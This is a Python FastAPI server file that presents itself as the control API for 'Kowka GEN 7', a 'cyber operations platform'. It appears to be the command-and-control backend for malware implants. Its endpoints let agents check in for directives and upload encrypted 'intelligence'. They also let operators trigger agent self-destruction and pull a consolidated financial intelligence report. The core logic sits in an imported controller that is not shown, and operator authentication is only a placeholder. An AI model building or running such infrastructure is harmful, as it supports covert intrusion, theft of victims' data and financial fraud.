#!/usr/bin/env python3
"""
Kowka GEN 7 FastAPI Server
REST API for control center operations
"""

from fastapi import FastAPI, HTTPException, Depends, Security
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import Dict, List, Optional
import logging

from main_controller import KowkaMainController

# Initialize FastAPI application
app = FastAPI(
    title="Kowka GEN 7 Control API",
    description="Quantum-resistant cyber operations platform",
    version="7.0.0",
    docs_url="/docs",
    redoc_url="/redoc"
)

# CORS middleware for frontend communication
app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://localhost:3000", "https://kowka-control.com"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Security setup
security = HTTPBearer()
controller = KowkaMainController()

# Pydantic models for request/response
class AgentCheckin(BaseModel):
    agent_id: str
    auth_token: str
    system_profile: Dict
    metrics: Dict
    risk_assessment: str

class IntelligenceData(BaseModel):
    agent_id: str
    data_type: str
    encrypted_data: str
    timestamp: str

class DirectiveResponse(BaseModel):
    status: str
    directives: List[Dict]
    crypto_update: Optional[Dict]

class SystemStatus(BaseModel):
    operational_status: str
    active_agents: int
    intelligence_throughput: float
    security_posture: str

async def verify_operator_token(credentials: HTTPAuthorizationCredentials = Security(security)):
    """Verify operator authentication token"""
    # Implementation would validate JWT or similar token
    if not credentials.credentials:
        raise HTTPException(status_code=401, detail="Invalid authentication token")
    return credentials.credentials

@app.on_event("startup")
async def startup_event():
    """Initialize controller on startup"""
    await controller.initialize_system()

@app.post("/v1/agent/checkin", response_model=DirectiveResponse)
async def agent_checkin(checkin: AgentCheckin):
    """Endpoint for agent check-in and directive retrieval"""
    try:
        response = await controller.process_agent_checkin(
            checkin.agent_id,
            checkin.dict()
        )
        return response
    except Exception as e:
        logging.error(f"Agent checkin failed: {str(e)}")
        raise HTTPException(status_code=500, detail="Checkin processing failed")

@app.post("/v1/intelligence/upload")
async def upload_intelligence(data: IntelligenceData, token: str = Depends(verify_operator_token)):
    """Endpoint for intelligence data upload from agents"""
    try:
        success = await controller.receive_intelligence_data(
            data.agent_id,
            data.data_type,
            data.dict()
        )
        return {"status": "SUCCESS" if success else "FAILED"}
    except Exception as e:
        logging.error(f"Intelligence upload failed: {str(e)}")
        raise HTTPException(status_code=500, detail="Intelligence processing failed")

@app.get("/v1/system/status", response_model=SystemStatus)
async def get_system_status(token: str = Depends(verify_operator_token)):
    """Get current system operational status"""
    return {
        "operational_status": controller.operational_status,
        "active_agents": len(controller.agent_registry),
        "intelligence_throughput": 0.0,  # Would calculate actual throughput
        "security_posture": "SECURE"
    }

@app.post("/v1/agent/{agent_id}/destruct/{protocol_level}")
async def execute_agent_destruction(agent_id: str, protocol_level: str, token: str = Depends(verify_operator_token)):
    """Execute destruction protocols for specified agent"""
    try:
        success = await controller.execute_destruction_protocol(agent_id, protocol_level)
        return {"status": "DESTRUCTION_EXECUTED" if success else "FAILED"}
    except Exception as e:
        logging.error(f"Destruction protocol failed: {str(e)}")
        raise HTTPException(status_code=500, detail="Destruction protocol failed")

@app.get("/v1/intelligence/financial/report")
async def get_financial_report(token: str = Depends(verify_operator_token)):
    """Get consolidated financial intelligence report"""
    try:
        report = await controller.financial_engine.generate_financial_report()
        return report
    except Exception as e:
        logging.error(f"Financial report generation failed: {str(e)}")
        raise HTTPException(status_code=500, detail="Report generation failed")

@app.get("/v1/agents/active")
async def get_active_agents(token: str = Depends(verify_operator_token)):
    """Get list of all active agents and their status"""
    return {
        "agents": [
            {
                "agent_id": agent_id,
                "last_checkin": data["last_checkin"].isoformat(),
                "risk_level": data["risk_level"]
            }
            for agent_id, data in controller.agent_registry.items()
        ]
    }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8443, ssl_keyfile="./key.pem", ssl_certfile="./cert.pem")
